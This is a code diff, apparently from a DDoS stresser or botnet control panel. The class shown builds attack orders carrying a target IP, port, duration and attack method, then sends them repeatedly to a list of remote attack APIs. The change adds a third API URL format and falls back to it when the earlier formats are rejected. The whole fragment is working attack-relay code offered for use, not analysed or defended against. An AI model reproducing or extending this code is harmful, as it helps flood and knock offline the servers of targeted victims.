@@ -423,6 +423,8 @@ class CLIENT_BUILDER():
                    api1 = apiv1.replace('IP',ip_tar).replace('NUM',port).replace('SEC',sec).replace('METHODS2',method)
                    apiv2 = '/TARGET2=IP&PORT=NUM&TIME=SEC&TYPE=METHODS2_HEX1629'
                    api2 = apiv2.replace('IP',ip_tar).replace('NUM',port).replace('SEC',sec).replace('METHODS2',method)
+                   apiv3 = '/IP=IP2&PORT=NUMBER&TIME=THREAD&METHODS=METHODS2_HEX1629'
+                   api3 = apiv3.replace('IP2',ip_tar).replace('NUMBER',port).replace('THREAD',sec).replace('METHODS2',method)
                    if len(api_list) != 0:
                      for _ in range(int(spam_api)):
                        for url_api in api_list:
@@ -430,11 +432,16 @@ class CLIENT_BUILDER():
                          r = requests.get(f'{url_api}{api1}', timeout=CHECKING.time_out_setting)
                         else:
                          r = requests.get(f'{url_api}{api1}')
-                        if '<title>400 PAGE</title>' in r.content.decode(): # FOR NOT SUPPORT
+                        if '<title>400 PAGE</title>' in r.content.decode(): # FOR NOT SUPPORT v1,v2
                          if CHECKING.time_out_setting != 0:
-                          r = requests.get(f'{url_api}{api1}', timeout=CHECKING.time_out_setting)
+                          r = requests.get(f'{url_api}{api2}', timeout=CHECKING.time_out_setting)
                          else:
-                          r = requests.get(f'{url_api}{api1}')
+                          r = requests.get(f'{url_api}{api2}')
+                         if '<title>400 PAGE</title>' in r.content.decode(): # FOR NOT SUPPORT v4,v5
+                          if CHECKING.time_out_setting != 0:
+                           r = requests.get(f'{url_api}{api3}', timeout=CHECKING.time_out_setting)
+                          else:
+                           r = requests.get(f'{url_api}{api3}')
                  else:
                     CLIENT_BUILDER.SEND(socks,f'{fg(196)}METHODS NOT FOUND')
                 else:
@@ -467,7 +474,7 @@ class CLIENT_BUILDER():
                          r = requests.get(f'{url_api}{api1}', timeout=CHECKING.time_out_setting)
                         else:
                          r = requests.get(f'{url_api}{api1}')
-                        if '<title>400 PAGE</title>' in r.content.decode(): # FOR NOT SUPPORT
+                        if '<title>400 PAGE</title>' in r.content.decode(): # FOR NOT SUPPORT v1,v2,v3
                           if CHECKING.time_out_setting != 0:
                            r = requests.get(f'{url_api}{api2}', timeout=CHECKING.time_out_setting)
                           else:
